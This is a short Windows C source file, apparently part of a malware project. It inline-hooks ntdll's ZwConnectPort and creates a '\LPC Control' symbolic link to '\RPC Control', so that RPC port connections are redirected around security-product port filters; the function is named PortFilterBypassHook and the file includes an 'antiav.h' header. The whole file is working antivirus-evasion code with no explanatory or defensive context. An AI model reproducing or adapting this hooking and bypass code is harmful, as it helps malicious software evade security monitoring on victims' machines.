#include <windows.h>
#include <stdio.h>

#include "ntdll.h"
#include "utils.h"
#include "splice.h"
#include "antiav.h"

typedef NTSTATUS (NTAPI *funcZwConnectPort)(PHANDLE PortHandle,PUNICODE_STRING PortName,PSECURITY_QUALITY_OF_SERVICE SecurityQos,PVOID ClientView,PVOID ServerView,PULONG MaxMessageLength,PVOID ConnectionInformation,PULONG ConnectionInformationLength);
BYTE OldZwConnectPortBytes[OLD_BYTES_SIZE] = {0};
funcZwConnectPort OldZwConnectPort = (funcZwConnectPort)&OldZwConnectPortBytes;

NTSTATUS NewZwConnectPort(PHANDLE PortHandle,PUNICODE_STRING PortName,PSECURITY_QUALITY_OF_SERVICE SecurityQos,PVOID ClientView,PVOID ServerView,PULONG MaxMessageLength,PVOID ConnectionInformation,PULONG ConnectionInformationLength)
{
	UNICODE_STRING usPortRPC = RTL_CONSTANT_STRING(L"\\RPC Control");

	if (RtlPrefixUnicodeString(&usPortRPC,PortName,TRUE)) PortName->Buffer[1] = L'L';

	return OldZwConnectPort(PortHandle,PortName,SecurityQos,ClientView,ServerView,MaxMessageLength,ConnectionInformation,ConnectionInformationLength);
}

VOID PortFilterBypassHook()
{
	NTSTATUS St;
	HANDLE hLink;
	OBJECT_ATTRIBUTES oaAttributes;
	UNICODE_STRING usPortRPCLink=RTL_CONSTANT_STRING(L"\\LPC Control");
	UNICODE_STRING usPortRPC=RTL_CONSTANT_STRING(L"\\??\\GLOBALROOT\\RPC Control");

	InitializeObjectAttributes(&oaAttributes,&usPortRPCLink,OBJ_CASE_INSENSITIVE,0,0);
	St = NtCreateSymbolicLinkObject(&hLink,SYMBOLIC_LINK_ALL_ACCESS,&oaAttributes,&usPortRPC);
	if (NT_SUCCESS(St))
	{
		Splice(GetProcAddress(GetModuleHandle("ntdll.dll"),"ZwConnectPort"),NewZwConnectPort,(PVOID)&OldZwConnectPortBytes);
	}
	else
	{
		DbgPrint(__FUNCTION__"(): NtCreateSymbolicLinkObject failed with status %x\n",St);
	}
}